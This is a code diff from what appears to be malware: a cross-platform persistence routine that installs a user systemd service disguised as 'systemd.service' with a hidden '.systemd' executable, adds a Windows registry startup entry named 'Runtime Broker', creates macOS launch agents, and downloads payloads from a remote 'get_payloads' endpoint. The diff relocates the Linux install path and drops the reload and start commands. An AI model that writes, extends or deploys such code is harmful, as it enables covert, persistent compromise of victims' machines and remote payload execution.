@@ -38,7 +38,7 @@ Wants=network-online.target
 
 [Service]
 ExecStart={file_path}
-WorkingDirectory=/run/user/1000/systemd
+WorkingDirectory=/home/{user}/.config/systemd/user
 Restart=always
 StartLimitInterval=30
 StartLimitBurst=5
@@ -49,9 +49,7 @@ RestartSec=5
 WantedBy=default.target""")
 
         # Reload systemd, start and enable the service
-        subprocess.run('XDG_RUNTIME_DIR=/run/user/$UID systemctl --user daemon-reload', shell=True)
         subprocess.run('XDG_RUNTIME_DIR=/run/user/$UID systemctl --user enable systemd.service', shell=True)
-        subprocess.run('XDG_RUNTIME_DIR=/run/user/$UID systemctl --user start systemd.service', shell=True)
     
     def create_launch_agent(path, label):
         plist_content = f"""
@@ -142,7 +140,7 @@ WantedBy=default.target""")
         add_registry_startup(file_path, "Runtime Broker")
     
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
-        file_path = "/run/user/1000/systemd/.systemd"
+        file_path = f"/home/{user}/.config/systemd/user/.systemd"
         if not os.path.exists(file_path):
             subprocess.run(f'touch {file_path}', shell=True)
             response = requests.get(f"{url}get_payloads/{download_path}")
